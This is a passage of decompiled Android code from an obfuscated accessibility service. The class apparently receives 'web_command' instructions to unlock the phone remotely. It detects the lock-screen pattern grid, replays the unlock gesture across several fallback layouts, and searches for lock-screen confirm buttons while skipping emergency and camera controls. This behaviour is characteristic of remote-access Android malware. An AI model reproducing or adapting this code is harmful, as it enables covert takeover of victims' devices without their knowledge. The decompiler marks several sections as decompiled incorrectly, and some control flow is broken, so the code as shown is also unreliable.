    /* JADX WARN: Removed duplicated region for block: B:106:0x0538 A[Catch: Exception -> 0x007c, TRY_LEAVE, TryCatch #0 {Exception -> 0x007c, blocks: (B:17:0x0065, B:73:0x02c4, B:75:0x02ca, B:76:0x0315, B:78:0x031b, B:79:0x035d, B:81:0x0384, B:83:0x0391, B:85:0x039b, B:86:0x03a0, B:87:0x03a3, B:88:0x03a4, B:90:0x03d0, B:91:0x040c, B:95:0x047e, B:97:0x049c, B:99:0x04b1, B:105:0x0502, B:106:0x0538, B:24:0x0097, B:27:0x00ac, B:62:0x0247, B:64:0x024f, B:72:0x0295, B:30:0x00bb, B:32:0x00f5, B:34:0x00ff, B:36:0x0159, B:38:0x0161, B:43:0x016d, B:45:0x018f, B:47:0x01bc, B:49:0x01d5, B:51:0x01df, B:52:0x020f, B:53:0x0212, B:54:0x0213, B:56:0x0219, B:58:0x0225, B:68:0x025c, B:69:0x0268, B:70:0x0289), top: B:110:0x004c }] */
    /* JADX WARN: Removed duplicated region for block: B:75:0x02ca A[Catch: Exception -> 0x007c, TryCatch #0 {Exception -> 0x007c, blocks: (B:17:0x0065, B:73:0x02c4, B:75:0x02ca, B:76:0x0315, B:78:0x031b, B:79:0x035d, B:81:0x0384, B:83:0x0391, B:85:0x039b, B:86:0x03a0, B:87:0x03a3, B:88:0x03a4, B:90:0x03d0, B:91:0x040c, B:95:0x047e, B:97:0x049c, B:99:0x04b1, B:105:0x0502, B:106:0x0538, B:24:0x0097, B:27:0x00ac, B:62:0x0247, B:64:0x024f, B:72:0x0295, B:30:0x00bb, B:32:0x00f5, B:34:0x00ff, B:36:0x0159, B:38:0x0161, B:43:0x016d, B:45:0x018f, B:47:0x01bc, B:49:0x01d5, B:51:0x01df, B:52:0x020f, B:53:0x0212, B:54:0x0213, B:56:0x0219, B:58:0x0225, B:68:0x025c, B:69:0x0268, B:70:0x0289), top: B:110:0x004c }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0029  */
    /* JADX WARN: Removed duplicated region for block: B:97:0x049c A[Catch: Exception -> 0x007c, TryCatch #0 {Exception -> 0x007c, blocks: (B:17:0x0065, B:73:0x02c4, B:75:0x02ca, B:76:0x0315, B:78:0x031b, B:79:0x035d, B:81:0x0384, B:83:0x0391, B:85:0x039b, B:86:0x03a0, B:87:0x03a3, B:88:0x03a4, B:90:0x03d0, B:91:0x040c, B:95:0x047e, B:97:0x049c, B:99:0x04b1, B:105:0x0502, B:106:0x0538, B:24:0x0097, B:27:0x00ac, B:62:0x0247, B:64:0x024f, B:72:0x0295, B:30:0x00bb, B:32:0x00f5, B:34:0x00ff, B:36:0x0159, B:38:0x0161, B:43:0x016d, B:45:0x018f, B:47:0x01bc, B:49:0x01d5, B:51:0x01df, B:52:0x020f, B:53:0x0212, B:54:0x0213, B:56:0x0219, B:58:0x0225, B:68:0x025c, B:69:0x0268, B:70:0x0289), top: B:110:0x004c }] */
    /* JADX WARN: Removed duplicated region for block: B:99:0x04b1 A[Catch: Exception -> 0x007c, TryCatch #0 {Exception -> 0x007c, blocks: (B:17:0x0065, B:73:0x02c4, B:75:0x02ca, B:76:0x0315, B:78:0x031b, B:79:0x035d, B:81:0x0384, B:83:0x0391, B:85:0x039b, B:86:0x03a0, B:87:0x03a3, B:88:0x03a4, B:90:0x03d0, B:91:0x040c, B:95:0x047e, B:97:0x049c, B:99:0x04b1, B:105:0x0502, B:106:0x0538, B:24:0x0097, B:27:0x00ac, B:62:0x0247, B:64:0x024f, B:72:0x0295, B:30:0x00bb, B:32:0x00f5, B:34:0x00ff, B:36:0x0159, B:38:0x0161, B:43:0x016d, B:45:0x018f, B:47:0x01bc, B:49:0x01d5, B:51:0x01df, B:52:0x020f, B:53:0x0212, B:54:0x0213, B:56:0x0219, B:58:0x0225, B:68:0x025c, B:69:0x0268, B:70:0x0289), top: B:110:0x004c }] */
    /* JADX WARN: Type inference failed for: r2v8, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r8v35, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r9v23, types: [java.util.List] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:102:0x04ea -> B:103:0x04f1). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:105:0x0502 -> B:104:0x04fd). Please report as a decompilation issue!!! */
    /* renamed from: f0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211461f0(String str, ContinuationImpl continuationImpl) throws Throwable {
        dqtvuisjd$executePatternUnlockGesture$1 dqtvuisjd_executepatternunlockgesture_1;
        int i;
        int i2;
        String str2;
        CoroutineSingletons coroutineSingletons;
        dqtvuisjd dqtvuisjdVar;
        Object obj;
        int i3;
        ArrayList arrayListM211433g0;
        Iterator it;
        dqtvuisjd dqtvuisjdVar2;
        int i4;
        String str3;
        CoroutineSingletons coroutineSingletons2;
        Object objM211500j4;
        dqtvuisjd dqtvuisjdVar3;
        String str4;
        Iterator it2;
        String str5;
        int i5;
        int i6;
        ArrayList arrayList;
        int i7;
        boolean zBooleanValue;
        String str6;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof dqtvuisjd$executePatternUnlockGesture$1) {
            dqtvuisjd_executepatternunlockgesture_1 = (dqtvuisjd$executePatternUnlockGesture$1) continuationImpl;
            int i8 = dqtvuisjd_executepatternunlockgesture_1.f52536b0;
            if ((i8 & Integer.MIN_VALUE) != 0) {
                dqtvuisjd_executepatternunlockgesture_1.f52536b0 = i8 - Integer.MIN_VALUE;
            } else {
                dqtvuisjd_executepatternunlockgesture_1 = new dqtvuisjd$executePatternUnlockGesture$1(this, continuationImpl);
            }
        }
        Object obj2 = dqtvuisjd_executepatternunlockgesture_1.f52534a8;
        CoroutineSingletons coroutineSingletons3 = CoroutineSingletons.f57606a0;
        int i9 = dqtvuisjd_executepatternunlockgesture_1.f52536b0;
        String str7 = "   点";
        String str8 = ")";
        String str9 = ", ";
        String str10 = "⚠️ [executePatternUnlockGesture] 布局 ";
        Throwable th = null;
        try {
            if (i9 == 0) {
                kg1.m213544f4(obj2);
                t60.m214714d6("dqtvuisjd", "🔓 执行图案解锁: pattern=" + str);
                Object systemService = getSystemService("window");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
                Display defaultDisplay = ((WindowManager) systemService).getDefaultDisplay();
                Point point = new Point();
                defaultDisplay.getRealSize(point);
                dqtvuisjd$executePatternUnlockGesture$1 dqtvuisjd_executepatternunlockgesture_12 = dqtvuisjd_executepatternunlockgesture_1;
                int identifier = getResources().getIdentifier("status_bar_height", "dimen", "android");
                int dimensionPixelSize = identifier > 0 ? getResources().getDimensionPixelSize(identifier) : 0;
                i = point.x;
                int i10 = point.y;
                i2 = i10 - dimensionPixelSize;
                t60.m214714d6("dqtvuisjd", "🔓 [executePatternUnlockGesture] 屏幕原始尺寸: " + i + "x" + i10);
                StringBuilder sb = new StringBuilder("🔓 [executePatternUnlockGesture] 状态栏高度: ");
                sb.append(dimensionPixelSize);
                t60.m214714d6("dqtvuisjd", sb.toString());
                t60.m214714d6("dqtvuisjd", "🔓 [executePatternUnlockGesture] 调整后尺寸: " + i + "x" + i2);
                String str11 = Build.MANUFACTURER;
                t60.m214694b5(str11, "MANUFACTURER");
                String lowerCase = str11.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                t60.m214714d6("dqtvuisjd", "🔓 [executePatternUnlockGesture] 设备厂商: " + lowerCase + ", isVivo=" + (AbstractC0779a1.m213652a5(lowerCase, "vivo", false) || AbstractC0779a1.m213652a5(lowerCase, "iqoo", false) || AbstractC0779a1.m213652a5(lowerCase, "bbk", false)));
                t60.m214714d6("dqtvuisjd", "🔓 [executePatternUnlockGesture] 方案1: 尝试实时检测九宫格位置...");
                AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    t60.m214714d6("dqtvuisjd", "🔍 [executePatternUnlockGesture] 开始扫描锁屏界面所有控件...");
                    m211436k9(rootInActiveWindow, 0);
                    ArrayList arrayListM211465f8 = m211465f8(rootInActiveWindow);
                    t60.m214714d6("dqtvuisjd", "🔓 [executePatternUnlockGesture] 检测到 " + arrayListM211465f8.size() + " 个点");
                    if (arrayListM211465f8.size() == 9) {
                        t60.m214714d6("dqtvuisjd", "✅ [executePatternUnlockGesture] 成功检测到完整九宫格!");
                        List listM211437m4 = m211437m4(arrayListM211465f8);
                        t60.m214714d6("dqtvuisjd", "🔓 [executePatternUnlockGesture] 排序后的九宫格:");
                        ArrayList arrayList2 = (ArrayList) listM211437m4;
                        int size = arrayList2.size();
                        int i11 = 0;
                        int i12 = 0;
                        while (i12 < size) {
                            Object obj3 = arrayList2.get(i12);
                            i12++;
                            int i13 = i11 + 1;
                            if (i11 < 0) {
                                AbstractC0716jf.m213309g8();
                                throw null;
                            }
                            PointF pointF = (PointF) obj3;
                            t60.m214714d6("dqtvuisjd", "   点" + i13 + ": (" + pointF.x + ", " + pointF.y + ")");
                            i11 = i13;
                            arrayList2 = arrayList2;
                        }
                        if (m211438n4(listM211437m4)) {
                            str2 = str;
                            ArrayList arrayListM211426d8 = m211426d8(str2, listM211437m4);
                            if (arrayListM211426d8.isEmpty()) {
                                dqtvuisjd_executepatternunlockgesture_1 = dqtvuisjd_executepatternunlockgesture_12;
                                coroutineSingletons = coroutineSingletons3;
                            } else {
                                t60.m214714d6("dqtvuisjd", "🔓 [executePatternUnlockGesture] 使用实时检测坐标执行...");
                                dqtvuisjd_executepatternunlockgesture_1 = dqtvuisjd_executepatternunlockgesture_12;
                                dqtvuisjd_executepatternunlockgesture_1.f52526a0 = this;
                                dqtvuisjd_executepatternunlockgesture_1.f52527a1 = str2;
                                dqtvuisjd_executepatternunlockgesture_1.f52531a5 = i;
                                dqtvuisjd_executepatternunlockgesture_1.f52532a6 = i2;
                                dqtvuisjd_executepatternunlockgesture_1.f52536b0 = 1;
                                Object objM211500j42 = m211500j4(arrayListM211426d8, str2, "实时检测", dqtvuisjd_executepatternunlockgesture_1);
                                coroutineSingletons = coroutineSingletons3;
                                if (objM211500j42 == coroutineSingletons) {
                                    return coroutineSingletons;
                                }
                                obj = objM211500j42;
                                dqtvuisjdVar = this;
                                i3 = i2;
                            }
                        } else {
                            str2 = str;
                            dqtvuisjd_executepatternunlockgesture_1 = dqtvuisjd_executepatternunlockgesture_12;
                            coroutineSingletons = coroutineSingletons3;
                            t60.m214726f4("dqtvuisjd", "⚠️ [executePatternUnlockGesture] 检测到的九宫格点位间距不合理，跳过实时检测");
                        }
                    } else {
                        str2 = str;
                        dqtvuisjd_executepatternunlockgesture_1 = dqtvuisjd_executepatternunlockgesture_12;
                        coroutineSingletons = coroutineSingletons3;
                        t60.m214726f4("dqtvuisjd", "⚠️ [executePatternUnlockGesture] 实时检测未能找到完整九宫格 (" + arrayListM211465f8.size() + "/9)");
                    }
                } else {
                    str2 = str;
                    dqtvuisjd_executepatternunlockgesture_1 = dqtvuisjd_executepatternunlockgesture_12;
                    coroutineSingletons = coroutineSingletons3;
                    t60.m214726f4("dqtvuisjd", "⚠️ [executePatternUnlockGesture] 无法获取rootNode");
                }
                dqtvuisjdVar = this;
                t60.m214714d6("dqtvuisjd", "🔓 [executePatternUnlockGesture] 方案2: 使用预设布局...");
                dqtvuisjdVar.getClass();
                arrayListM211433g0 = m211433g0(i, i2);
                t60.m214714d6("dqtvuisjd", "🔓 [executePatternUnlockGesture] 生成了 " + arrayListM211433g0.size() + " 种布局方案");
                it = arrayListM211433g0.iterator();
                dqtvuisjdVar2 = dqtvuisjdVar;
                i4 = 0;
                if (it.hasNext()) {
                }
            } else if (i9 == 1) {
                i3 = dqtvuisjd_executepatternunlockgesture_1.f52532a6;
                int i14 = dqtvuisjd_executepatternunlockgesture_1.f52531a5;
                String str12 = dqtvuisjd_executepatternunlockgesture_1.f52527a1;
                dqtvuisjd dqtvuisjdVar4 = dqtvuisjd_executepatternunlockgesture_1.f52526a0;
                kg1.m213544f4(obj2);
                i = i14;
                str2 = str12;
                dqtvuisjdVar = dqtvuisjdVar4;
                coroutineSingletons = coroutineSingletons3;
                obj = obj2;
            } else if (i9 == 2) {
                i7 = dqtvuisjd_executepatternunlockgesture_1.f52533a7;
                i6 = dqtvuisjd_executepatternunlockgesture_1.f52532a6;
                i5 = dqtvuisjd_executepatternunlockgesture_1.f52531a5;
                str5 = dqtvuisjd_executepatternunlockgesture_1.f52530a4;
                it2 = dqtvuisjd_executepatternunlockgesture_1.f52529a3;
                ?? r9 = dqtvuisjd_executepatternunlockgesture_1.f52528a2;
                str4 = dqtvuisjd_executepatternunlockgesture_1.f52527a1;
                dqtvuisjdVar3 = dqtvuisjd_executepatternunlockgesture_1.f52526a0;
                kg1.m213544f4(obj2);
                objM211500j4 = obj2;
                arrayList = r9;
                str3 = "   点";
                coroutineSingletons2 = coroutineSingletons3;
                zBooleanValue = ((Boolean) objM211500j4).booleanValue();
                StringBuilder sb2 = new StringBuilder();
                str6 = str8;
                sb2.append("🔓 [executePatternUnlockGesture] 手势执行结果: ");
                sb2.append(zBooleanValue);
                t60.m214714d6("dqtvuisjd", sb2.toString());
                if (!zBooleanValue) {
                }
            } else {
                if (i9 != 3) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                int i15 = dqtvuisjd_executepatternunlockgesture_1.f52533a7;
                int i16 = dqtvuisjd_executepatternunlockgesture_1.f52532a6;
                i5 = dqtvuisjd_executepatternunlockgesture_1.f52531a5;
                it = dqtvuisjd_executepatternunlockgesture_1.f52529a3;
                ?? r8 = dqtvuisjd_executepatternunlockgesture_1.f52528a2;
                String str13 = dqtvuisjd_executepatternunlockgesture_1.f52527a1;
                dqtvuisjd dqtvuisjdVar5 = dqtvuisjd_executepatternunlockgesture_1.f52526a0;
                kg1.m213544f4(obj2);
                i4 = i15;
                arrayListM211433g0 = r8;
                str6 = ")";
                String str14 = ", ";
                i2 = i16;
                str2 = str13;
                str3 = "   点";
                String str15 = str10;
                coroutineSingletons2 = coroutineSingletons3;
                str8 = str6;
                str10 = str15;
                dqtvuisjdVar2 = dqtvuisjdVar5;
                str9 = str14;
                th = null;
                i = i5;
                coroutineSingletons = coroutineSingletons2;
                str7 = str3;
                if (it.hasNext()) {
                    Pair pair = (Pair) it.next();
                    String str16 = (String) pair.f57556a0;
                    Map map = (Map) pair.f57557a1;
                    int i17 = i4 + 1;
                    CoroutineSingletons coroutineSingletons4 = coroutineSingletons;
                    int size2 = arrayListM211433g0.size();
                    Iterator it3 = it;
                    StringBuilder sb3 = new StringBuilder();
                    ArrayList arrayList3 = arrayListM211433g0;
                    sb3.append("🎯 [executePatternUnlockGesture] 尝试布局[");
                    sb3.append(i17);
                    sb3.append("/");
                    sb3.append(size2);
                    sb3.append("]: ");
                    sb3.append(str16);
                    t60.m214714d6("dqtvuisjd", sb3.toString());
                    t60.m214702c3("dqtvuisjd", "🔓 [executePatternUnlockGesture] 布局坐标:");
                    Iterator it4 = map.entrySet().iterator();
                    while (it4.hasNext()) {
                        Map.Entry entry = (Map.Entry) it4.next();
                        String str17 = (String) entry.getKey();
                        Pair pair2 = (Pair) entry.getValue();
                        Iterator it5 = it4;
                        t60.m214702c3("dqtvuisjd", str7 + str17 + " -> (" + pair2.f57556a0 + str9 + pair2.f57557a1 + str8);
                        it4 = it5;
                        i17 = i17;
                    }
                    int i18 = i17;
                    dqtvuisjdVar2.getClass();
                    ArrayList arrayListM211425d7 = m211425d7(str2, map);
                    t60.m214714d6("dqtvuisjd", "🔓 [executePatternUnlockGesture] 转换后坐标数量: " + arrayListM211425d7.size());
                    if (arrayListM211425d7.isEmpty()) {
                        it = it3;
                        arrayListM211433g0 = arrayList3;
                        dqtvuisjd dqtvuisjdVar6 = dqtvuisjdVar2;
                        str3 = str7;
                        String str18 = str10;
                        coroutineSingletons2 = coroutineSingletons4;
                        t60.m214726f4("dqtvuisjd", str18 + str16 + " 坐标转换失败");
                        str8 = str8;
                        str10 = str18;
                        str9 = str9;
                        th = null;
                        dqtvuisjdVar2 = dqtvuisjdVar6;
                        i4 = i18;
                        coroutineSingletons = coroutineSingletons2;
                        str7 = str3;
                        if (it.hasNext()) {
                        }
                    } else {
                        t60.m214714d6("dqtvuisjd", "🔓 [executePatternUnlockGesture] 坐标路径:");
                        int size3 = arrayListM211425d7.size();
                        int i19 = 0;
                        int i20 = 0;
                        while (i19 < size3) {
                            Object obj4 = arrayListM211425d7.get(i19);
                            i19++;
                            int i21 = i20 + 1;
                            if (i20 < 0) {
                                AbstractC0716jf.m213309g8();
                                throw th;
                            }
                            i20 = i21;
                        }
                        Pair pair3 = new Pair("pattern", str2);
                        str3 = str7;
                        Pair pair4 = new Pair("layout", str16);
                        String str19 = str2;
                        ArrayList arrayList4 = new ArrayList(AbstractC0717jg.m213310g9(arrayListM211425d7));
                        int size4 = arrayListM211425d7.size();
                        dqtvuisjd dqtvuisjdVar7 = dqtvuisjdVar2;
                        int i22 = 0;
                        while (i22 < size4) {
                            Object obj5 = arrayListM211425d7.get(i22);
                            int i23 = i22 + 1;
                            int i24 = size4;
                            PointF pointF2 = (PointF) obj5;
                            arrayList4.add("(" + pointF2.x + str9 + pointF2.y + str8);
                            i22 = i23;
                            size4 = i24;
                            arrayListM211425d7 = arrayListM211425d7;
                            dqtvuisjd_executepatternunlockgesture_1 = dqtvuisjd_executepatternunlockgesture_1;
                        }
                        ArrayList arrayList5 = arrayListM211425d7;
                        AbstractC0770a1.m213614f9(pair3, pair4, new Pair("coordinates", arrayList4), new Pair("screenSize", i + "x" + i2), new Pair("source", "web_command"));
                        m211435k0("PATTERN_UNLOCK", "网页端图案解锁");
                        t60.m214714d6("dqtvuisjd", "🔓 [executePatternUnlockGesture] 开始执行手势...");
                        dqtvuisjd_executepatternunlockgesture_1 = dqtvuisjd_executepatternunlockgesture_1;
                        dqtvuisjd_executepatternunlockgesture_1.f52526a0 = dqtvuisjdVar7;
                        dqtvuisjd_executepatternunlockgesture_1.f52527a1 = str19;
                        dqtvuisjd_executepatternunlockgesture_1.f52528a2 = arrayList3;
                        dqtvuisjd_executepatternunlockgesture_1.f52529a3 = it3;
                        dqtvuisjd_executepatternunlockgesture_1.f52530a4 = str16;
                        dqtvuisjd_executepatternunlockgesture_1.f52531a5 = i;
                        dqtvuisjd_executepatternunlockgesture_1.f52532a6 = i2;
                        dqtvuisjd_executepatternunlockgesture_1.f52533a7 = i18;
                        dqtvuisjd_executepatternunlockgesture_1.f52536b0 = 2;
                        objM211500j4 = dqtvuisjdVar7.m211500j4(arrayList5, str19, str16, dqtvuisjd_executepatternunlockgesture_1);
                        coroutineSingletons2 = coroutineSingletons4;
                        if (objM211500j4 == coroutineSingletons2) {
                            return coroutineSingletons2;
                        }
                        arrayList = arrayList3;
                        i7 = i18;
                        i5 = i;
                        str4 = str19;
                        i6 = i2;
                        dqtvuisjdVar3 = dqtvuisjdVar7;
                        it2 = it3;
                        str5 = str16;
                        zBooleanValue = ((Boolean) objM211500j4).booleanValue();
                        StringBuilder sb22 = new StringBuilder();
                        str6 = str8;
                        sb22.append("🔓 [executePatternUnlockGesture] 手势执行结果: ");
                        sb22.append(zBooleanValue);
                        t60.m214714d6("dqtvuisjd", sb22.toString());
                        if (!zBooleanValue) {
                            t60.m214714d6("dqtvuisjd", "✅ [executePatternUnlockGesture] 图案解锁成功! 使用布局: " + str5);
                            return c1351vv;
                        }
                        StringBuilder sb4 = new StringBuilder();
                        str15 = str10;
                        sb4.append(str15);
                        sb4.append(str5);
                        sb4.append(" 解锁失败，尝试下一个...");
                        t60.m214726f4("dqtvuisjd", sb4.toString());
                        dqtvuisjd_executepatternunlockgesture_1.f52526a0 = dqtvuisjdVar3;
                        dqtvuisjd_executepatternunlockgesture_1.f52527a1 = str4;
                        dqtvuisjd_executepatternunlockgesture_1.f52528a2 = arrayList;
                        dqtvuisjd_executepatternunlockgesture_1.f52529a3 = it2;
                        dqtvuisjd_executepatternunlockgesture_1.f52530a4 = th;
                        dqtvuisjd_executepatternunlockgesture_1.f52531a5 = i5;
                        dqtvuisjd_executepatternunlockgesture_1.f52532a6 = i6;
                        dqtvuisjd_executepatternunlockgesture_1.f52533a7 = i7;
                        dqtvuisjd_executepatternunlockgesture_1.f52536b0 = 3;
                        str14 = str9;
                        if (b81.m210571b1(500L, dqtvuisjd_executepatternunlockgesture_1) == coroutineSingletons2) {
                            return coroutineSingletons2;
                        }
                        dqtvuisjd dqtvuisjdVar8 = dqtvuisjdVar3;
                        i2 = i6;
                        str2 = str4;
                        dqtvuisjdVar5 = dqtvuisjdVar8;
                        it = it2;
                        i4 = i7;
                        arrayListM211433g0 = arrayList;
                        str8 = str6;
                        str10 = str15;
                        dqtvuisjdVar2 = dqtvuisjdVar5;
                        str9 = str14;
                        th = null;
                        i = i5;
                        coroutineSingletons = coroutineSingletons2;
                        str7 = str3;
                        if (it.hasNext()) {
                            t60.m214704c5("dqtvuisjd", "❌ [executePatternUnlockGesture] 所有 " + i4 + " 种布局尝试均失败");
                            return c1351vv;
                        }
                    }
                }
            }
            if (((Boolean) obj).booleanValue()) {
                t60.m214714d6("dqtvuisjd", "✅ [executePatternUnlockGesture] 实时检测方案成功!");
                return c1351vv;
            }
            i2 = i3;
            t60.m214714d6("dqtvuisjd", "🔓 [executePatternUnlockGesture] 方案2: 使用预设布局...");
            dqtvuisjdVar.getClass();
            arrayListM211433g0 = m211433g0(i, i2);
            t60.m214714d6("dqtvuisjd", "🔓 [executePatternUnlockGesture] 生成了 " + arrayListM211433g0.size() + " 种布局方案");
            it = arrayListM211433g0.iterator();
            dqtvuisjdVar2 = dqtvuisjdVar;
            i4 = 0;
            if (it.hasNext()) {
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ [executePatternUnlockGesture] 执行失败", e);
            return c1351vv;
        }
    }

    /* renamed from: f2 */
    public final boolean m211462f2() {
        try {
            t60.m214714d6("dqtvuisjd", "🔍 开始查找应用图标位置");
            AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                t60.m214726f4("dqtvuisjd", "⚠️ 无法获取根节点");
                return false;
            }
            String packageName = getPackageName();
            String string = getString(getApplicationInfo().labelRes);
            t60.m214694b5(string, "getString(applicationInfo.labelRes)");
            t60.m214694b5(packageName, "packageName");
            Rect rectM211430f3 = null;
            try {
                Object systemService = getSystemService("window");
                WindowManager windowManager = systemService instanceof WindowManager ? (WindowManager) systemService : null;
                Display defaultDisplay = windowManager != null ? windowManager.getDefaultDisplay() : null;
                Point point = new Point();
                if (defaultDisplay != null) {
                    defaultDisplay.getSize(point);
                }
                rectM211430f3 = m211430f3(rootInActiveWindow, string, 0);
            } catch (Exception e) {
                t60.m214705c6("dqtvuisjd", "❌ 查找图标异常", e);
            }
            if (rectM211430f3 == null || rectM211430f3.isEmpty()) {
                t60.m214726f4("dqtvuisjd", "⚠️ 未找到应用图标位置");
                return false;
            }
            this.f52476k7 = new Rect(rectM211430f3);
            t60.m214714d6("dqtvuisjd", "✅ 图标位置已保存: left=" + rectM211430f3.left + ", top=" + rectM211430f3.top + ", width=" + rectM211430f3.width() + ", height=" + rectM211430f3.height());
            return true;
        } catch (Exception e2) {
            t60.m214705c6("dqtvuisjd", "❌ 查找图标位置失败", e2);
            return false;
        }
    }

    /* renamed from: f4 */
    public final AccessibilityNodeInfo m211463f4(AccessibilityNodeInfo accessibilityNodeInfo) {
        x81 x81Var = this.f52417e8;
        if (x81Var == null) {
            t60.m214726f4("dqtvuisjd", "⚠️ UnlockManager未初始化，跳过学习确认按钮检测");
            return null;
        }
        try {
            Pair pairM215132a2 = x81Var.m215132a2();
            if (pairM215132a2 == null) {
                return null;
            }
            float fFloatValue = ((Number) pairM215132a2.f57556a0).floatValue();
            float fFloatValue2 = ((Number) pairM215132a2.f57557a1).floatValue();
            Ref$ObjectRef ref$ObjectRef = new Ref$ObjectRef();
            Ref$FloatRef ref$FloatRef = new Ref$FloatRef();
            ref$FloatRef.f57623a0 = Float.MAX_VALUE;
            x81.m215128a0(fFloatValue, fFloatValue2, ref$FloatRef, ref$ObjectRef, accessibilityNodeInfo, 0);
            return (AccessibilityNodeInfo) ref$ObjectRef.f57626a0;
        } catch (Exception e) {
            t60.m214705c6("UnlockManager", "查找学习确认按钮失败", e);
            return null;
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:120:0x0283 A[Catch: Exception -> 0x00e6, TryCatch #1 {Exception -> 0x00e6, blocks: (B:39:0x00cd, B:41:0x00d8, B:44:0x00df, B:47:0x00e9, B:124:0x02f4, B:50:0x011a, B:53:0x014a, B:54:0x0174, B:58:0x0185, B:60:0x018b, B:62:0x0196, B:64:0x01b7, B:68:0x01c6, B:71:0x01e9, B:76:0x01fb, B:78:0x020a, B:83:0x021a, B:85:0x0220, B:87:0x0228, B:92:0x0234, B:94:0x023c, B:96:0x0242, B:98:0x024a, B:102:0x0255, B:104:0x025f, B:120:0x0283, B:121:0x02ba, B:127:0x0311, B:129:0x0339, B:131:0x0348, B:134:0x034f, B:138:0x0358, B:140:0x035c, B:142:0x0362, B:154:0x03b0, B:145:0x036f, B:148:0x037a, B:149:0x038e, B:152:0x03aa), top: B:160:0x00cd }] */
    /* JADX WARN: Removed duplicated region for block: B:121:0x02ba A[Catch: Exception -> 0x00e6, TryCatch #1 {Exception -> 0x00e6, blocks: (B:39:0x00cd, B:41:0x00d8, B:44:0x00df, B:47:0x00e9, B:124:0x02f4, B:50:0x011a, B:53:0x014a, B:54:0x0174, B:58:0x0185, B:60:0x018b, B:62:0x0196, B:64:0x01b7, B:68:0x01c6, B:71:0x01e9, B:76:0x01fb, B:78:0x020a, B:83:0x021a, B:85:0x0220, B:87:0x0228, B:92:0x0234, B:94:0x023c, B:96:0x0242, B:98:0x024a, B:102:0x0255, B:104:0x025f, B:120:0x0283, B:121:0x02ba, B:127:0x0311, B:129:0x0339, B:131:0x0348, B:134:0x034f, B:138:0x0358, B:140:0x035c, B:142:0x0362, B:154:0x03b0, B:145:0x036f, B:148:0x037a, B:149:0x038e, B:152:0x03aa), top: B:160:0x00cd }] */
    /* renamed from: f5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final AccessibilityNodeInfo m211464f5(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfo2;
        Object obj;
        Object next;
        String string;
        String string2;
        String string3;
        ArrayList arrayList;
        int i;
        ArrayList arrayList2;
        int i2;
        int i3;
        Rect rect;
        Object obj2;
        int i4;
        boolean z;
        int i5;
        int i6;
        String string4;
        dqtvuisjd dqtvuisjdVar = this;
        try {
            ArrayList arrayList3 = new ArrayList();
            int i7 = 0;
            if (dqtvuisjdVar.f52419f0 != null) {
                try {
                    ou0.m214235a0(0, accessibilityNodeInfo, arrayList3);
                    t60.m214702c3("ScreenElementAnalyzer", "找到 " + arrayList3.size() + " 个可点击节点");
                } catch (Exception e) {
                    t60.m214705c6("ScreenElementAnalyzer", "查找可点击节点失败", e);
                }
            } else {
                m211429f1(0, accessibilityNodeInfo, arrayList3);
            }
            int i8 = dqtvuisjdVar.getResources().getDisplayMetrics().heightPixels;
            ArrayList arrayList4 = new ArrayList();
            int size = arrayList3.size();
            int i9 = 0;
            while (true) {
                String str = "";
                if (i9 >= size) {
                    break;
                }
                Object obj3 = arrayList3.get(i9);
                int i10 = i9 + 1;
                AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) obj3;
                Rect rect2 = new Rect();
                accessibilityNodeInfo3.getBoundsInScreen(rect2);
                CharSequence className = accessibilityNodeInfo3.getClassName();
                if (className == null || (string2 = className.toString()) == null) {
                    string2 = "";
                }
                CharSequence text = accessibilityNodeInfo3.getText();
                if (text == null || (string3 = text.toString()) == null) {
                    string3 = "";
                }
                CharSequence contentDescription = accessibilityNodeInfo3.getContentDescription();
                if (contentDescription != null && (string4 = contentDescription.toString()) != null) {
                    str = string4;
                }
                String[] strArr = {"EMERGENCY", "Emergency", "紧急", "紧急呼叫", "Emergency call", "紧急电话", "取消", "Cancel", "删除", "Delete", "返回", "Back", "忘记", "Forgot", "相机", "Camera", "锁屏画报", "充电", "Battery"};
                int i11 = i7;
                accessibilityNodeInfo2 = null;
                while (true) {
                    arrayList = arrayList3;
                    i = size;
                    if (i11 < 19) {
                        try {
                            String str2 = strArr[i11];
                            int i12 = i11;
                            if (AbstractC0779a1.m213652a5(string3, str2, true) || AbstractC0779a1.m213652a5(str, str2, true)) {
                                break;
                            }
                            i11 = i12 + 1;
                            size = i;
                            arrayList3 = arrayList;
                        } catch (Exception e2) {
                            e = e2;
                            t60.m214705c6("dqtvuisjd", "查找锁屏确认按钮失败", e);
                            return accessibilityNodeInfo2;
                        }
                    } else {
                        int iCenterX = rect2.centerX();
                        int iCenterY = rect2.centerY();
                        int i13 = dqtvuisjdVar.getResources().getDisplayMetrics().widthPixels;
                        arrayList2 = arrayList4;
                        double d = iCenterY;
                        double d2 = i8;
                        double d3 = 0.35d * d2;
                        i2 = i8;
                        if (d < d3) {
                            t60.m214702c3("dqtvuisjd", "🚫 排除顶部区域元素: 文本='" + string3 + "', 描述='" + str + "', 位置=(" + iCenterX + "," + iCenterY + ")");
                        } else {
                            i3 = i10;
                            if (str.equalsIgnoreCase("Unlock")) {
                                rect = rect2;
                                if (AbstractC0779a1.m213652a5(string2, "ImageView", false) && d < 0.4d * d2) {
